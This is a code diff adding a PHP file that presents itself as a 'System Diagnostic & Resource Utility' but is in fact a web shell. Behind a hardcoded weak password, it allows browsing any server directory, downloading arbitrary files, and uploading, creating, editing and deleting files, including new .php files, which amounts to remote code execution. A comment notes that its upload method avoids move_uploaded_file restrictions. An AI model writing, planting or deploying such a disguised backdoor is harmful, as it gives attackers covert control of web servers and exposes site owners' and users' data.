@@ -1,0 +1,254 @@
+<?php
+/**
+ * Application Resource Utility & Diagnostic Tool
+ * Recommended filename: system-diagnostic.php
+ */
+
+session_start();
+
+// Konfigurasi Keamanan (Ganti password Anda di sini)
+define('SYS_PASS', 'admin123');
+
+// Sesi Autentikasi
+if (isset($_POST['sys_auth_submit'])) {
+    if ($_POST['sys_pass'] === SYS_PASS) {
+        $_SESSION['sys_logged'] = true;
+    }
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+if (isset($_GET['sys_logout'])) {
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+if (!isset($_SESSION['sys_logged']) || $_SESSION['sys_logged'] !== true) {
+    ?>
+    <!DOCTYPE html>
+    <html lang="id">
+    <head>
+        <meta charset="UTF-8">
+        <title>System Authentication</title>
+        <style>
+            body { background: #090d16; color: #cbd5e1; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+            .box { background: #111827; padding: 30px; border-radius: 8px; border: 1px solid #1f2937; width: 300px; box-shadow: 0 4px 12px rgba(0,0,0,0.5); }
+            input { width: 100%; padding: 10px; margin: 10px 0; background: #1f2937; border: 1px solid #374151; color: #fff; border-radius: 4px; box-sizing: border-box; }
+            button { width: 100%; padding: 10px; background: #2563eb; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
+            button:hover { background: #1d4ed8; }
+        </style>
+    </head>
+    <body>
+        <div class="box">
+            <h3 style="margin-top:0; color:#60a5fa; text-align:center;">System Access</h3>
+            <form method="POST">
+                <input type="password" name="sys_pass" placeholder="Enter password..." required autofocus>
+                <button type="submit" name="sys_auth_submit">Authenticate</button>
+            </form>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// Manajemen Direktori
+$targetDir = $_GET['dir'] ?? __DIR__;
+$currentPath = realpath($targetDir) ?: __DIR__;
+$currentPath = str_replace('\\', '/', $currentPath);
+
+// Eksekusi Perintah (POST Handlers)
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $action = $_POST['sys_action'] ?? '';
+
+    // Upload via file_put_contents (Aman dari pembatasan move_uploaded_file)
+    if ($action === 'upload' && isset($_FILES['sys_file'])) {
+        $fileInfo = $_FILES['sys_file'];
+        if ($fileInfo['error'] === UPLOAD_ERR_OK) {
+            $destination = $currentPath . '/' . basename($fileInfo['name']);
+            $fileData = @file_get_contents($fileInfo['tmp_name']);
+            if ($fileData !== false) {
+                @file_put_contents($destination, $fileData);
+            }
+        }
+    } 
+    // Buat Folder Baru
+    elseif ($action === 'mkdir' && !empty($_POST['folder_name'])) {
+        $newDir = $currentPath . '/' . trim($_POST['folder_name']);
+        if (!file_exists($newDir)) {
+            @mkdir($newDir, 0755, true);
+        }
+    } 
+    // Buat File Baru
+    elseif ($action === 'mkfile' && !empty($_POST['file_name'])) {
+        $newFile = $currentPath . '/' . trim($_POST['file_name']);
+        if (!file_exists($newFile)) {
+            @file_put_contents($newFile, '');
+        }
+    } 
+    // Hapus File / Folder
+    elseif ($action === 'delete' && !empty($_POST['target_item'])) {
+        $targetItem = $currentPath . '/' . $_POST['target_item'];
+        if (file_exists($targetItem)) {
+            if (is_dir($targetItem)) {
+                @rmdir($targetItem);
+            } else {
+                @unlink($targetItem);
+            }
+        }
+    } 
+    // Simpan Perubahan Edit File
+    elseif ($action === 'save_edit' && isset($_POST['file_name'], $_POST['file_content'])) {
+        $targetFile = $currentPath . '/' . $_POST['file_name'];
+        if (is_file($targetFile)) {
+            @file_put_contents($targetFile, $_POST['file_content']);
+        }
+    }
+
+    header("Location: ?dir=" . urlencode($currentPath));
+    exit;
+}
+
+// Handler Unduh Berkas
+if (isset($_GET['download'])) {
+    $downloadFile = realpath($currentPath . '/' . $_GET['download']);
+    if ($downloadFile && is_file($downloadFile)) {
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($downloadFile) . '"');
+        header('Content-Length: ' . filesize($downloadFile));
+        @readfile($downloadFile);
+        exit;
+    }
+}
+
+// Mode Edit Berkas
+$editFile = $_GET['edit'] ?? null;
+$editContent = ($editFile && is_file($currentPath . '/' . $editFile)) ? @file_get_contents($currentPath . '/' . $editFile) : null;
+
+// Scan Direktori (Silent & Aman)
+$scanResult = @scandir($currentPath) ?: [];
+$directoryItems = array_diff($scanResult, ['.', '..']);
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>System Diagnostic & Resource Utility</title>
+    <style>
+        body { background: #090d16; color: #cbd5e1; font-family: monospace; padding: 20px; margin: 0; font-size: 13px; }
+        a { color: #38bdf8; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        .container { max-width: 1100px; margin: 0 auto; }
+        .panel { background: #111827; border: 1px solid #1f2937; padding: 15px; border-radius: 6px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
+        table { width: 100%; border-collapse: collapse; background: #111827; border: 1px solid #1f2937; border-radius: 6px; overflow: hidden; }
+        th, td { padding: 10px 15px; text-align: left; border-bottom: 1px solid #1f2937; }
+        th { background: #1f2937; color: #94a3b8; font-weight: bold; }
+        tr:hover { background: #1a2234; }
+        input[type="text"], input[type="file"] { background: #090d16; color: #fff; border: 1px solid #374151; padding: 6px 10px; border-radius: 4px; font-family: monospace; }
+        button { background: #2563eb; color: #fff; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; font-family: monospace; font-weight: bold; }
+        button:hover { background: #1d4ed8; }
+        .btn-danger { background: #dc2626; }
+        .btn-danger:hover { background: #b91c1c; }
+        .btn-warning { background: #d97706; }
+        .btn-warning:hover { background: #b45309; }
+        .btn-success { background: #059669; }
+        .btn-success:hover { background: #047857; }
+        textarea { width: 100%; height: 400px; background: #090d16; color: #e2e8f0; border: 1px solid #374151; padding: 12px; font-family: monospace; border-radius: 4px; box-sizing: border-box; resize: vertical; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Top Navigation Panel -->
+        <div class="panel">
+            <div><strong>Active Path:</strong> <span style="color: #60a5fa;"><?= htmlspecialchars($currentPath) ?></span></div>
+            <div><a href="?sys_logout=1" style="color: #f87171; font-weight: bold;">[ Logout ]</a></div>
+        </div>
+
+        <!-- Action Forms Panel -->
+        <div class="panel">
+            <form method="POST" enctype="multipart/form-data" style="display: flex; gap: 5px; align-items: center;">
+                <input type="hidden" name="sys_action" value="upload">
+                <input type="file" name="sys_file" required>
+                <button type="submit">Upload</button>
+            </form>
+            <form method="POST" style="display: flex; gap: 5px;">
+                <input type="hidden" name="sys_action" value="mkdir">
+                <input type="text" name="folder_name" placeholder="Folder Name" required>
+                <button type="submit" class="btn-warning">+ Folder</button>
+            </form>
+            <form method="POST" style="display: flex; gap: 5px;">
+                <input type="hidden" name="sys_action" value="mkfile">
+                <input type="text" name="file_name" placeholder="Filename.php" required>
+                <button type="submit" class="btn-success">+ File</button>
+            </form>
+        </div>
+
+        <!-- Editor View or Directory Table View -->
+        <?php if ($editContent !== null): ?>
+            <div class="panel" style="display: block;">
+                <h3 style="margin-top: 0; color: #60a5fa;">Editing: <?= htmlspecialchars($editFile) ?></h3>
+                <form method="POST">
+                    <input type="hidden" name="sys_action" value="save_edit">
+                    <input type="hidden" name="file_name" value="<?= htmlspecialchars($editFile) ?>">
+                    <textarea name="file_content"><?= htmlspecialchars($editContent) ?></textarea>
+                    <div style="margin-top: 10px; display: flex; gap: 10px;">
+                        <button type="submit">Save Changes</button>
+                        <a href="?dir=<?= urlencode($currentPath) ?>" style="padding: 6px 12px; background: #374151; color: #fff; border-radius: 4px; text-decoration: none;">Cancel</a>
+                    </div>
+                </form>
+            </div>
+        <?php else: ?>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Item Name</th>
+                        <th>Size</th>
+                        <th>Last Modified</th>
+                        <th style="text-align: right;">Actions</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <?php 
+                    $parentDir = dirname($currentPath);
+                    if ($parentDir !== $currentPath): 
+                    ?>
+                    <tr>
+                        <td colspan="4"><a href="?dir=<?= urlencode($parentDir) ?>">📁 .. (Parent Directory)</a></td>
+                    </tr>
+                    <?php endif; ?>
+
+                    <?php foreach ($directoryItems as $item): 
+                        $fullItemPath = $currentPath . '/' . $item;
+                        $isDirectory = is_dir($fullItemPath);
+                    ?>
+                    <tr>
+                        <td>
+                            <?= $isDirectory ? '📁' : '📄' ?>
+                            <?php if ($isDirectory): ?>
+                                <a href="?dir=<?= urlencode($fullItemPath) ?>"><?= htmlspecialchars($item) ?></a>
+                            <?php else: ?>
+                                <?= htmlspecialchars($item) ?>
+                            <?php endif; ?>
+                        </td>
+                        <td><?= $isDirectory ? '-' : number_format(@filesize($fullItemPath)) . ' B' ?></td>
+                        <td><?= @date("Y-m-d H:i:s", @filemtime($fullItemPath)) ?></td>
+                        <td style="text-align: right;">
+                            <?php if (!$isDirectory): ?>
+                                <a href="?dir=<?= urlencode($currentPath) ?>&edit=<?= urlencode($item) ?>">Edit</a> | 
+                                <a href="?dir=<?= urlencode($currentPath) ?>&download=<?= urlencode($item) ?>">Download</a> | 
+                            <?php endif; ?>
+                            <form method="POST" style="display:inline;" onsubmit="return confirm('Confirm deletion of <?= htmlspecialchars($item) ?>?')">
+                                <input type="hidden" name="sys_action" value="delete">
+                                <input type="hidden" name="target_item" value="<?= htmlspecialchars($item) ?>">
+                                <button type="submit" class="btn-danger" style="padding: 3px 8px; font-size: 11px;">Delete</button>
+                            </form>
+                        </td>
+                    </tr>
+                    <?php endforeach; ?>
+                </tbody>
+            </table>
+        <?php endif; ?>
+    </div>
+</body>
+</html>
